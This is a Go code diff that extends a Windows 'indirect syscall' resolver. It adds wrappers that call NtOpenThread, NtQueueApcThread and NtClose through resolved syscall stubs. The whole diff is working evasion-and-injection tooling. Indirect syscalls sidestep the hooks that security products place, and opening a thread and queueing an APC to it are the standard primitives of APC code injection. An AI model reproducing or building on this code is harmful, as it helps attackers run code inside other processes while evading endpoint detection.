@@ -128,6 +128,8 @@ func (r *SyscallResolver) init() error {
 		"NtResumeThread",
 		"NtGetContextThread",
 		"NtSetContextThread",
+		"NtOpenThread",
+		"NtQueueApcThread",
 	}
 
 	for _, name := range keyFunctions {
@@ -604,5 +606,68 @@ func IndirectNtSetContextThread(threadHandle uintptr, context uintptr) uint32 {
 		threadHandle,
 		context,
 	)
+	return uint32(r)
+}
+
+// IndirectNtOpenThread opens a thread handle via indirect syscall.
+// NTSTATUS NtOpenThread(*ThreadHandle, DesiredAccess, *OBJECT_ATTRIBUTES, *CLIENT_ID)
+func IndirectNtOpenThread(threadHandle *uintptr, desiredAccess uint32, tid uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtOpenThread"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+
+	type clientID struct {
+		UniqueProcess uintptr
+		UniqueThread  uintptr
+	}
+	cid := clientID{UniqueThread: tid}
+
+	type objectAttributes struct {
+		Length                   uint32
+		_                       uint32
+		RootDirectory            uintptr
+		ObjectName               uintptr
+		Attributes               uint32
+		_                        uint32
+		SecurityDescriptor       uintptr
+		SecurityQualityOfService uintptr
+	}
+	oa := objectAttributes{Length: uint32(unsafe.Sizeof(objectAttributes{}))}
+
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		uintptr(unsafe.Pointer(threadHandle)),
+		uintptr(desiredAccess),
+		uintptr(unsafe.Pointer(&oa)),
+		uintptr(unsafe.Pointer(&cid)),
+	)
+	return uint32(r)
+}
+
+// IndirectNtQueueApcThread queues an APC to a thread via indirect syscall.
+// NTSTATUS NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3)
+func IndirectNtQueueApcThread(threadHandle, apcRoutine, arg1, arg2, arg3 uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtQueueApcThread"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		threadHandle,
+		apcRoutine,
+		arg1,
+		arg2,
+		arg3,
+	)
+	return uint32(r)
+}
+
+// IndirectNtClose closes a handle via indirect syscall.
+// NTSTATUS NtClose(Handle)
+func IndirectNtClose(handle uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtClose"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr, handle)
 	return uint32(r)
 }
